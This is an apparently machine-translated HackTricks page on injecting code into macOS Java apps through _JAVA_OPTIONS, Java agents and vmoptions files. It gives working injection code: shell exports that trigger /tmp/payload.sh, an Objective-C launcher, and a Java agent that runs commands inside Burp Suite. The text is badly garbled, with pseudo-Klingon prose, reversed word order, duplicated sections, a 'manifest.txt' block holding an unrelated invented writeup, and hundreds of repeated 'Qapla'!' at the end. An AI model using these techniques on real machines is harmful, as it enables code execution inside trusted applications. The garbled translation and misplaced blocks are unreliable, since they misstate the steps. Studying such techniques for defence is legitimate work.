# macOS Java Applications Injection

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Enumeration

Find Java applications installed in your system. It was noticed that Java apps in the **Info.plist** will contain some java parameters which contain the string **`java.`**, so you can search for that:

---

## qo'noS Java Applications Injection

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>laH</strong></a><strong>!</strong></summary>

HackTricks ni qar'a'wI'pu'chaj je 'oH **company advertised in HackTricks** pe'vIl **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Enumeration

Qo'noS DaH jatlhlaH Java applications. Java apps **Info.plist** vItlhutlh java parameters **java.** string **java.** vItlhutlh, vaj vItlhutlh:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA\_OPTIONS

The env variable **`_JAVA_OPTIONS`** can be used to inject arbitrary java parameters in the execution of a java compiled app:

## \_JAVA\_OPTIONS

The env variable **`_JAVA_OPTIONS`** can be used to inject arbitrary java parameters in the execution of a java compiled app:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
To execute it as a new process and not as a child of the current terminal you can use:

```
tlhIngan Hol
```

<b>tlhIngan Hol</b>
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
DaH jImej, 'ach 'oH 'e' vItlhutlh 'e' vItlhutlh. java agent vItlhutlh 'ej:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
{% hint style="danger" %}
Qap agent vItlhutlh **Java version** vaj application crash execution vaj agent vaj application
{% endhint %}

Agent.java vaj:
```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
{% endcode %}

To compile the agent run:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt`-wIj: 

```
# macOS Java Apps Injection

## Description

Java applications running on macOS can be vulnerable to injection attacks, allowing an attacker to execute arbitrary code within the context of the application. This can lead to privilege escalation and unauthorized access to sensitive information.

## Exploitation

1. Identify the target Java application running on the macOS system.

2. Locate the Java Archive (JAR) file associated with the application.

3. Extract the contents of the JAR file using a tool like `jar` or `unzip`.

4. Look for the `manifest.txt` file within the extracted contents.

5. Open the `manifest.txt` file and search for the `Main-Class` attribute. This attribute specifies the main class that is executed when the application starts.

6. Modify the `Main-Class` attribute value to point to a malicious class file that you have created.

7. Save the changes to the `manifest.txt` file.

8. Repackage the modified contents back into a JAR file using the same tool used for extraction.

9. Replace the original JAR file associated with the target application with the modified JAR file.

10. When the target application is launched, the malicious code specified in the modified `Main-Class` attribute will be executed.

## Mitigation

To mitigate the risk of Java application injection attacks on macOS, consider the following measures:

- Regularly update the Java Runtime Environment (JRE) to the latest version to benefit from security patches and bug fixes.

- Implement strong access controls and permissions for Java applications to limit the impact of potential injection attacks.

- Use code signing and verification mechanisms to ensure the integrity and authenticity of Java application files.

- Employ runtime security solutions that can detect and prevent injection attacks in real-time.

- Regularly monitor and review the logs and behavior of Java applications for any signs of unauthorized activity.

By following these best practices, you can enhance the security of Java applications running on macOS and reduce the risk of injection attacks.
```

`manifest.txt`-wIj: 

```
# macOS Java Apps Injection

## Description

Java applications running on macOS can be vulnerable to injection attacks, allowing an attacker to execute arbitrary code within the context of the application. This can lead to privilege escalation and unauthorized access to sensitive information.

## Exploitation

1. Identify the target Java application running on the macOS system.

2. Locate the Java Archive (JAR) file associated with the application.

3. Extract the contents of the JAR file using a tool like `jar` or `unzip`.

4. Look for the `manifest.txt` file within the extracted contents.

5. Open the `manifest.txt` file and search for the `Main-Class` attribute. This attribute specifies the main class that is executed when the application starts.

6. Modify the `Main-Class` attribute value to point to a malicious class file that you have created.

7. Save the changes to the `manifest.txt` file.

8. Repackage the modified contents back into a JAR file using the same tool used for extraction.

9. Replace the original JAR file associated with the target application with the modified JAR file.

10. When the target application is launched, the malicious code specified in the modified `Main-Class` attribute will be executed.

## Mitigation

To mitigate the risk of Java application injection attacks on macOS, consider the following measures:

- Regularly update the Java Runtime Environment (JRE) to the latest version to benefit from security patches and bug fixes.

- Implement strong access controls and permissions for Java applications to limit the impact of potential injection attacks.

- Use code signing and verification mechanisms to ensure the integrity and authenticity of Java application files.

- Employ runtime security solutions that can detect and prevent injection attacks in real-time.

- Regularly monitor and review the logs and behavior of Java applications for any signs of unauthorized activity.

By following these best practices, you can enhance the security of Java applications running on macOS and reduce the risk of injection attacks.
```
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
'ejDaq 'ej vItlhutlh java 'oH application Hoch vItlhutlh je.
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions file

**vmoptions** file jatlh **Java params** specification **support**. Java **execute** **when** **trick** **previous** **some** **use** **could** **and** **params** **java** **change** **to** **tricks** **the** **of** **some** **use** **could** **and** **commands** **arbitrary** **execute** **process** **the**.

**Moreover**, **file** **included** **an** **change** **also** **could** **so** **directory** `include` **the** **with** **others**.

**Even more**, **`vmoptions`** **file** **one** **than** **more** **load** **will** **apps** **Java**.

**Some** **Studio** **Android** **like** **applications** **these** **for** **looking** **are** **they** **where** **output** **their** **in** **indicates**.
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
ghItlh 'e' vItlhutlh.
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'!
